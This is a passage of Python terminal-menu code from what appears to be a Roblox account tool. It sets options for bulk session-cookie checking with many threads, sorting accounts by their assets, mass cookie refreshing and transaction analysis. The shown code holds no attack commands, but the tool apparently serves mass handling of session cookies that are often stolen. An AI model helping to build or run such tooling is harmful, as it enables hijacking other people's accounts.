                                                                                                cmdWriter(f' [{generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory, str(categoryData[choice][0]))}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_You_Sure}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.FG.WHITE}] ┃ {MT_I_Am_Sure}\n [{ANSI.FG.RED}N{ANSI.FG.WHITE}] ┃ {MT_Not_Yet}\n\n')
                                                                                                confirmTheAction = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                                                                match confirmTheAction:
                                                                                                    case 'Y' | 'Н':
                                                                                                        removeItemFromCategory(config['Roblox']['CookieChecker']['Main'][f'{_nameOfCategory}_List'], categoryData[choice][-2])
                                                                                                        autoSaveConfig()
                                                                                                        whileTrueStage6 = False
                                                                                                        whileTrueStage7 = False
                                                                                                    case 'N' | 'Т':
                                                                                                        whileTrueStage7 = False

                                                                                                removeLines(8)
                                                                                        else:
                                                                                            whileTrueStage6 = False
                                                                                            removeItemFromCategory(config['Roblox']['CookieChecker']['Main'][f'{_nameOfCategory}_List'], categoryData[choice][-2])
                                                                                            autoSaveConfig()
                                                                                            removeLines(7)
                                                                                    case 'F' | 'А':
                                                                                        labelASCII()
                                                                                    case 'R' | 'К':
                                                                                        loadConfig(configLoader['Loader']['Current_Config'])
                                                                                    case _:
                                                                                        removeLines(7)

                                                                                autoSaveConfigAndRemoveLinesInSettings(settingsRCCGeneralCategoryContextMenuTab, ('C', 'С'), ('0', 'C', 'С', 'R', 'К'), 7)
                                                                        case 'M' | 'Ь':
                                                                            labelASCII()
                                                                            whileTrueStage6 = True
                                                                            while whileTrueStage6:
                                                                                listWithModes = outputModes[nameOfCategory]
                                                                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory, MT_Output_Mode)}\n\n')
                                                                                for index, mode in enumerate(listWithModes):
                                                                                    cmdWriter(f' [{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['Main'][f'{_nameOfCategory}_Output_Mode'] == mode)} {sortLabels[mode]}\n')
                                                                                cmdWriter(f'  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Cancel}\n\n')
                                                                                settingsRCCGeneralCategoryOutputMode = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ')
                                                                                match settingsRCCGeneralCategoryOutputMode:
                                                                                    case settingsRCCGeneralCategoryOutputMode if settingsRCCGeneralCategoryOutputMode.startswith('0'):
                                                                                        if len(settingsRCCGeneralCategoryOutputMode) == 1:
                                                                                            whileTrueStage6 = False
                                                                                    case settingsRCCGeneralCategoryOutputMode if (settingsRCCGeneralCategoryOutputMode.isdigit() and int(settingsRCCGeneralCategoryOutputMode) <= len(listWithModes)):
                                                                                        config['Roblox']['CookieChecker']['Main'][f'{_nameOfCategory}_Output_Mode'] = listWithModes[int(settingsRCCGeneralCategoryOutputMode) - 1]
                                                                                        autoSaveConfig()

                                                                                removeLines(len(listWithModes) + 6)
                                                                        case ('A' | 'Ф') if hasList:
                                                                            labelASCII()
                                                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory)}\n\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Cancel}\n\n')
                                                                            settingsRCCGeneralCategoryItemAdd = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {sortLabels[nameOfCategory][1]}: ')
                                                                            match nameOfCategory:
                                                                                case 'Custom Gamepasses':
                                                                                    addCustomGamepassRoblox(settingsRCCGeneralCategoryItemAdd, nameOfCategory)
                                                                                case 'Favorite Places' | 'Places Weekly Playtime':
                                                                                    await addPlaceRoblox(settingsRCCGeneralCategoryItemAdd, nameOfCategory)
                                                                                case 'Bundles':
                                                                                    await addBundleRoblox(settingsRCCGeneralCategoryItemAdd, nameOfCategory)
                                                                        case ('+' | '=') if hasList:
                                                                            for item in config['Roblox']['CookieChecker']['Main'][f'{_nameOfCategory}_List']:
                                                                                item[-1] = True
                                                                        case ('-' | '_') if hasList:
                                                                            for item in config['Roblox']['CookieChecker']['Main'][f'{_nameOfCategory}_List']:
                                                                                item[-1] = False
                                                                        case 'C' | 'С':
                                                                            config['Roblox']['CookieChecker']['Main'][_nameOfCategory] ^= True
                                                                        case 'R' | 'К':
                                                                            loadConfig(configLoader['Loader']['Current_Config'])
                                                                    labelASCII()
                                                                    autoSaveConfigAndRemoveLinesInSettings(settingsRCCGeneralCategoryTab, ('+', '=', '-', '_', 'C', 'С'), (), 0)
                                                            case settingsRCCMainTab if (settingsRCCMainTab.isdigit() and int(settingsRCCMainTab) <= len(cookieData.listOfCookieData)):
                                                                config['Roblox']['CookieChecker']['Main'][cookieData.listOfCookieData[int(settingsRCCMainTab) - 1][1]] ^= True
                                                                autoSaveConfig()
                                                            case '+' | '=':
                                                                for param in cookieData.listOfCookieData:
                                                                    config['Roblox']['CookieChecker']['Main'][param[1]] = True
                                                            case '-' | '_':
                                                                for param in cookieData.listOfCookieData:
                                                                    config['Roblox']['CookieChecker']['Main'][param[1]] = False
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                        labelASCII()
                                                        autoSaveConfigAndRemoveLinesInSettings(settingsRCCMainTab, ('+', '=', '-', '_'), (), 0)
                                                # Сортировка
                                                case '3':
                                                    removeLines(11)
                                                    cookieDataCategories = [[category[0], category[1], category[2]] for category in cookieData.listOfCookieData
                                                                            if category[2] in (str, int)]
                                                    sortLabels = {
                                                        'Gamepasses'        : MT_Sort_By_Gamepass_Name,
                                                        'Custom Gamepasses' : MT_Sort_By_Gamepass_Name,
                                                        'Badges'            : MT_Sort_By_Badge_Name,
                                                        **dict.fromkeys(
                                                            ['Favorite Places', 'Places Weekly Playtime'],
                                                            MT_Sort_By_Place_Name
                                                        ),
                                                        'Bundles'           : MT_Sort_By_Bundle_Name,
                                                        'Groups Owned'      : MT_Sort_By_Group_Name,
                                                        'Roblox Badges'     : MT_Sort_By_Badge_Name
                                                    }
                                                    whileTrueStage4 = True
                                                    while whileTrueStage4:
                                                        configRCCSorting = config['Roblox']['CookieChecker']['Sorting']
                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting)}\n\n')
                                                        printSortCategories(cookieDataCategories)
                                                        cmdWriter(f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configRCCSorting['Sort'])} {MT_Sort}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                        settingsRCCGeneralSortTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                        match settingsRCCGeneralSortTab:
                                                            case settingsRCCGeneralSortTab if settingsRCCGeneralSortTab.startswith('0'):
                                                                if len(settingsRCCGeneralSortTab) == 1:
                                                                    whileTrueStage4 = False
                                                            case settingsRCCGeneralSortTab if (settingsRCCGeneralSortTab.isdigit() and int(settingsRCCGeneralSortTab) <= len(cookieDataCategories)):
                                                                settingsRCCGeneralSortTabNumber = int(settingsRCCGeneralSortTab) - 1
                                                                categoryMenuName, categoryConfigName, categoryType = cookieDataCategories[settingsRCCGeneralSortTabNumber]
                                                                if categoryType == int:
                                                                    labelASCII()
                                                                    showOptionSortNames = categoryMenuName in sortLabels
                                                                    showOptionSortPlaces = categoryMenuName in ('Gamepasses', 'Badges')
                                                                    amountOfLines = 10
                                                                    buttonsList = ('3', 'S', 'Ы', 'R', 'К')
                                                                    if showOptionSortNames:
                                                                        amountOfLines += 1
                                                                        buttonsList += ('4',)
                                                                        if showOptionSortPlaces:
                                                                            amountOfLines += 1
                                                                            buttonsList += ('5',)
                                                                    optionFunctions = {
                                                                        '1': [2, getSortValuesFrom,   printSortValuesFrom],
                                                                        '2': [3, getSortValuesFromTo, printSortValuesFromTo]
                                                                    }
                                                                    whileTrueStage5 = True
                                                                    while whileTrueStage5:
                                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configRCCSorting[categoryConfigName][2][0])} {MT_Sort_Numbers_From.format('...')}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configRCCSorting[categoryConfigName][3][0])} {MT_Sort_Numbers_From_To.format('...', '...')}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configRCCSorting[categoryConfigName][1])} {MT_Sort_By_Zero}\n')
                                                                        if showOptionSortNames:
                                                                            cmdWriter(f' [{ANSI.FG.PINK}4{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configRCCSorting[f'{categoryConfigName}_Names'])} {sortLabels[categoryMenuName]}\n')
                                                                        if showOptionSortPlaces:
                                                                            cmdWriter(f' [{ANSI.FG.PINK}5{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configRCCSorting[f'{categoryConfigName}_Places'])} {MT_Sort_By_Place_Name}\n')
                                                                        cmdWriter(f'  ┃ \n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configRCCSorting[categoryConfigName][0])} {MT_Sort}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                                        settingsRCCGeneralSortCategoryTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                                        match settingsRCCGeneralSortCategoryTab:
                                                                            case '0':
                                                                                whileTrueStage5 = False
                                                                            case '1' | '2':
                                                                                removeLines(amountOfLines)
                                                                                indexOfValues = optionFunctions[settingsRCCGeneralSortCategoryTab][0]
                                                                                whileTrueStage6 = True
                                                                                while whileTrueStage6:
                                                                                    sortValues = optionFunctions[settingsRCCGeneralSortCategoryTab][1](categoryConfigName)
                                                                                    cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName)}\n\n')
                                                                                    optionFunctions[settingsRCCGeneralSortCategoryTab][2](sortValues, categoryConfigName)
                                                                                    cmdWriter(f'{f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Disable_All}\n  ┃\n' if sortValues else ''} [{ANSI.FG.YELLOW}A{ANSI.FG.WHITE}] ┃ {MT_Add_A_Parameter}\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configRCCSorting[categoryConfigName][indexOfValues][0])} {MT_Sort}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                                                    settingsRCCSortNumberContextMenuTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                                                    match settingsRCCSortNumberContextMenuTab:
                                                                                        case settingsRCCSortNumberContextMenuTab if settingsRCCSortNumberContextMenuTab.startswith('0'):
                                                                                            if len(settingsRCCSortNumberContextMenuTab) == 1:
                                                                                                whileTrueStage6 = False
                                                                                        case settingsRCCSortNumberContextMenuTab if (settingsRCCSortNumberContextMenuTab.isdigit() and int(settingsRCCSortNumberContextMenuTab) <= len(sortValues)):
                                                                                            choice = int(settingsRCCSortNumberContextMenuTab) - 1
                                                                                            labelASCII()
                                                                                            whileTrueStage7 = True
                                                                                            while whileTrueStage7:
                                                                                                fromOrFromToString = f'{MT_From.lower()} {sortValues[choice][0] if settingsRCCGeneralSortCategoryTab == '1' else f'{sortValues[choice][0][0]} {MT_To.lower()} {sortValues[choice][0][1]}'}'
                                                                                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName, fromOrFromToString)}\n\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configRCCSorting[categoryConfigName][indexOfValues][1][choice][1])} {MT_Sort}\n [{ANSI.FG.RED}D{ANSI.FG.WHITE}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                                                                settingsRCCGeneralSortValueContextMenuTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                                                                match settingsRCCGeneralSortValueContextMenuTab:
                                                                                                    case '0':
                                                                                                        whileTrueStage7 = False
                                                                                                    case 'S' | 'Ы':
                                                                                                        configRCCSorting[categoryConfigName][indexOfValues][1][choice][1] ^= True
                                                                                                    case 'D' | 'В':
                                                                                                        if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                                                                                                            removeLines(7)
                                                                                                            whileTrueStage8 = True
                                                                                                            while whileTrueStage8:
                                                                                                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName, str(sortValues[choice][0]))}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_You_Sure}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.FG.WHITE}] ┃ {MT_I_Am_Sure}\n [{ANSI.FG.RED}N{ANSI.FG.WHITE}] ┃ {MT_Not_Yet}\n\n')
                                                                                                                confirmTheAction = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                                                                                match confirmTheAction:
                                                                                                                    case 'Y' | 'Н':
                                                                                                                        configRCCSorting[categoryConfigName][indexOfValues][1].pop(choice)
                                                                                                                        autoSaveConfig()
                                                                                                                        whileTrueStage7 = False
                                                                                                                        whileTrueStage8 = False
                                                                                                                    case 'N' | 'Т':
                                                                                                                        whileTrueStage8 = False

                                                                                                                removeLines(8)
                                                                                                        else:
                                                                                                            whileTrueStage7 = False
                                                                                                            configRCCSorting[categoryConfigName][indexOfValues][1].pop(choice)
                                                                                                            autoSaveConfig()
                                                                                                            removeLines(7)
                                                                                                    case 'F' | 'А':
                                                                                                        labelASCII()
                                                                                                    case _:
                                                                                                        removeLines(7)

                                                                                                autoSaveConfigAndRemoveLinesInSettings(settingsRCCGeneralSortValueContextMenuTab, ('S', 'Ы'), ('0', 'S', 'Ы'), 7)
                                                                                        case '+' | '=':
                                                                                            for index, _ in enumerate(sortValues):
                                                                                                configRCCSorting[categoryConfigName][indexOfValues][1][index][1] = True
                                                                                        case '-' | '_':
                                                                                            for index, _ in enumerate(sortValues):
                                                                                                configRCCSorting[categoryConfigName][indexOfValues][1][index][1] = False
                                                                                        case 'A' | 'Ф':
                                                                                            labelASCII()
                                                                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Sorting, categoryMenuName)}\n\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Cancel}\n\n')
                                                                                            settingsRCCGeneralSortParameterAdd = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_The_Parameter_Value}: ').strip()
                                                                                            match settingsRCCGeneralSortCategoryTab:
                                                                                                case '1': addSortParameterFrom(  settingsRCCGeneralSortParameterAdd, configRCCSorting, categoryConfigName, categoryMenuName)
                                                                                                case '2': addSortParameterFromTo(settingsRCCGeneralSortParameterAdd, configRCCSorting, categoryConfigName, categoryMenuName)
                                                                                        case 'S' | 'Ы':
                                                                                            configRCCSorting[categoryConfigName][indexOfValues][0] ^= True
                                                                                    labelASCII()
                                                                                    autoSaveConfigAndRemoveLinesInSettings(settingsRCCSortNumberContextMenuTab, ('+', '=', '-', '_', 'S', 'Ы'), (), 0)
                                                                            case '3':
                                                                                configRCCSorting[categoryConfigName][1] ^= True
                                                                            case '4' if showOptionSortNames:
                                                                                configRCCSorting[f'{categoryConfigName}_Names'] ^= True
                                                                            case '5' if showOptionSortPlaces:
                                                                                configRCCSorting[f'{categoryConfigName}_Places'] ^= True
                                                                            case 'S' | 'Ы':
                                                                                configRCCSorting[categoryConfigName][0] ^= True
                                                                            case 'F' | 'А':
                                                                                labelASCII()
                                                                            case 'R' | 'К':
                                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                                            case _:
                                                                                removeLines(amountOfLines)

                                                                        autoSaveConfigAndRemoveLinesInSettings(settingsRCCGeneralSortCategoryTab, buttonsList, buttonsList + ('0',), amountOfLines)
                                                                elif categoryType == str:
                                                                    configRCCSorting[categoryConfigName] ^= True
                                                                    autoSaveConfig()
                                                            case '+' | '=':
                                                                for category in cookieDataCategories:
                                                                    if category[2] == int and ([value[0] for value in configRCCSorting[category[1]][2][1] if value[1]] or [value[0] for value in configRCCSorting[category[1]][3][1] if value[1]]):
                                                                        configRCCSorting[category[1]][0] = True
                                                                    elif category[2] == str:
                                                                        configRCCSorting[category[1]] = True
                                                            case '-' | '_':
                                                                for category in cookieDataCategories:
                                                                    if category[2] == int:
                                                                        configRCCSorting[category[1]][0] = False
                                                                    elif category[2] == str:
                                                                        configRCCSorting[category[1]] = False
                                                            case 'S' | 'Ы':
                                                                configRCCSorting['Sort'] ^= True
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                        labelASCII()
                                                        autoSaveConfigAndRemoveLinesInSettings(settingsRCCGeneralSortTab, ('+', '=', '-', '_', 'S', 'Ы'), (), 0)
                                                # Плейсы
                                                case '4':
                                                    removeLines(11)
                                                    whileTrueStage4 = True
                                                    while whileTrueStage4:
                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Places)}\n\n')
                                                        printPlacesRCC()
                                                        cmdWriter(f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                        settingsRCCPlacesTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ')
                                                        match settingsRCCPlacesTab:
                                                            case settingsRCCPlacesTab if settingsRCCPlacesTab.startswith('0'):
                                                                if len(settingsRCCPlacesTab) == 1:
                                                                    whileTrueStage4 = False
                                                            case settingsRCCPlacesTab if (settingsRCCPlacesTab.isdigit() and int(settingsRCCPlacesTab) <= len(listOfPlaces)):
                                                                placeContextMenuRCC(int(settingsRCCPlacesTab) - 1)
                                                            case '+' | '=':
                                                                for place in listOfPlaces:
                                                                    config['Roblox']['CookieChecker']['Places'][place.placeNames[1]] = True
                                                            case '-' | '_':
                                                                for place in listOfPlaces:
                                                                    config['Roblox']['CookieChecker']['Places'][place.placeNames[1]] = False
                                                        labelASCII()
                                                        autoSaveConfigAndRemoveLinesInSettings(settingsRCCPlacesTab, ('+', '=', '-', '_'), (), 0)
                                                # Кастомные плейсы
                                                case '5':
                                                    removeLines(11)
                                                    whileTrueStage4 = True
                                                    while whileTrueStage4:
                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Custom_Places)}\n\n')
                                                        printCustomPlacesRCC()
                                                        cmdWriter(f'{f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Disable_All}\n  ┃\n' if config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'] else ''} [{ANSI.FG.YELLOW}A{ANSI.FG.WHITE}] ┃ {MT_Add_A_Place_By_ID}\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['CustomPlaces']['Show_Game_ID_Next_To_The_Name'])} {MT_Show_Place_ID_Next_To_The_Name}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                        settingsRCCCustomPlacesTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                        match settingsRCCCustomPlacesTab:
                                                            case settingsRCCCustomPlacesTab if settingsRCCCustomPlacesTab.startswith('0'):
                                                                if len(settingsRCCCustomPlacesTab) == 1:
                                                                    whileTrueStage4 = False
                                                            case settingsRCCCustomPlacesTab if (settingsRCCCustomPlacesTab.isdigit() and int(settingsRCCCustomPlacesTab) <= len(config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'])):
                                                                customPlaceContextMenuRCC(int(settingsRCCCustomPlacesTab) - 1)
                                                            case 'A' | 'Ф':
                                                                labelASCII()
                                                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Custom_Places)}\n\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Cancel}\n\n')
                                                                settingsRCCCustomPlaceAdd = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_The_Place_ID}: ')
                                                                await addCustomPlaceRoblox(settingsRCCCustomPlaceAdd)
                                                            case '+' | '=':
                                                                for place in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']:
                                                                    config['Roblox']['CookieChecker']['CustomPlaces'][str(place)][2] = True
                                                            case '-' | '_':
                                                                for place in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']:
                                                                    config['Roblox']['CookieChecker']['CustomPlaces'][str(place)][2] = False
                                                            case 'S' | 'Ы':
                                                                config['Roblox']['CookieChecker']['CustomPlaces']['Show_Game_ID_Next_To_The_Name'] ^= True
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                        labelASCII()
                                                        autoSaveConfigAndRemoveLinesInSettings(settingsRCCCustomPlacesTab, ('+', '=', '-', '_', 'S', 'Ы'), (), 0)
                                                case 'F' | 'А':
                                                    labelASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    removeLines(11)

                                            autoSaveConfigAndRemoveLinesInSettings(settingsRCCTab, (), ('0', 'R', 'К'), 11)
                                    # Куки сортер (RCS)
                                    case '3':
                                        removeLines(11)
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Sorter)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Output_Filename}: {config['Roblox']['CookieSorter']['Output_Filename']}.txt\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                            settingsRCSTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                            match settingsRCSTab:
                                                case '0':
                                                    whileTrueStage3 = False
                                                case '1':
                                                    removeLines(5)
                                                    newOutputFilenameRCS = input(f' [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] {MT_Cancel}\n\n [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_New_Filename}: ')
                                                    changeOutputFilenameRoblox('CookieSorter', newOutputFilenameRCS)
                                                case 'F' | 'А':
                                                    labelASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    removeLines(7)

                                            autoSaveConfigAndRemoveLinesInSettings(settingsRCSTab, (), ('0', 'R', 'К'), 7)
                                    # Куки рефрешер (RCR)
                                    case '4':
                                        removeLines(11)
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Refresher)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Single_Mode}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Mass_Mode}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                            settingsRCRTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                            match settingsRCRTab:
                                                case '0':
                                                    whileTrueStage3 = False
                                                case '1' | '2':
                                                    mode = {
                                                        '1': { 'trLabel': MT_Single_Mode, 'configKey': 'SingleMode' },
                                                        '2': { 'trLabel': MT_Mass_Mode,   'configKey': 'MassMode' }
                                                    }[settingsRCRTab]
                                                    removeLines(8)
                                                    whileTrueStage4 = True
                                                    while whileTrueStage4:
                                                        saveModes = config['Roblox']['CookieRefresher'][mode['configKey']]['Cookie_Save_Mode']
                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Refresher, mode['trLabel'])}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(1 in saveModes or 2 not in saveModes)} {MT_Save[1]} \'{MT_Old_Cookie.lower()} > {MT_New_Cookie.lower()}\' {MT_In[0].lower()} \'old_cookie - new_cookie.txt\'\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(2 in saveModes)} {MT_Save[1]} \'{MT_New_Cookie.lower()}\' {MT_In[0].lower()} \'new_cookie.txt\'\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                        settingsRCRModeTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                        match settingsRCRModeTab:
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case '1' | '2':
                                                                caseValue = int(settingsRCRModeTab)
                                                                if caseValue in saveModes:
                                                                    if len(saveModes) > 1:
                                                                        saveModes.remove(caseValue)
                                                                else:
                                                                    saveModes.append(caseValue)
                                                            case 'F' | 'А':
                                                                labelASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                removeLines(8)

                                                        autoSaveConfigAndRemoveLinesInSettings(settingsRCRModeTab, ('1', '2'), ('0', '1', '2', 'R', 'К'), 8)
                                                case 'F' | 'А':
                                                    labelASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    removeLines(8)

                                            autoSaveConfigAndRemoveLinesInSettings(settingsRCRTab, (), ('0', 'R', 'К'), 8)
                                    # Анализ транзакций (RTA)
                                    case '5':
                                        removeLines(11)
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_General}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Places}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                            settingsTransactionAnalysisTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                            match settingsTransactionAnalysisTab:
                                                case '0':
                                                    whileTrueStage3 = False
                                                # Общее
                                                case '1':
                                                    removeLines(8)
                                                    whileTrueStage4 = True
                                                    while whileTrueStage4:
                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_General)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['TransactionAnalysis']['General']['First_Check_All_Cookies_For_Valid'])} {MT_First_Check_All_Cookies_For_Valid}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Number_Of_Threads_For_Valid_Checker}: {int(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Valid_Checker']) if str(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Valid_Checker']).isdigit() and (0 < int(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Valid_Checker']) <= 1000) else 10}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {MT_Number_Of_Threads_For_Transaction_Analysis}: {int(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis']) if str(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis']).isdigit() and (0 < int(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis']) <= 500) else 10}\n [{ANSI.FG.PINK}4{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['TransactionAnalysis']['General']['Indentation_By_The_Longest_Name'])} {MT_Indentation_By_The_Longest_Place_Name}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                        settingsTransactionAnalysisGeneralTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
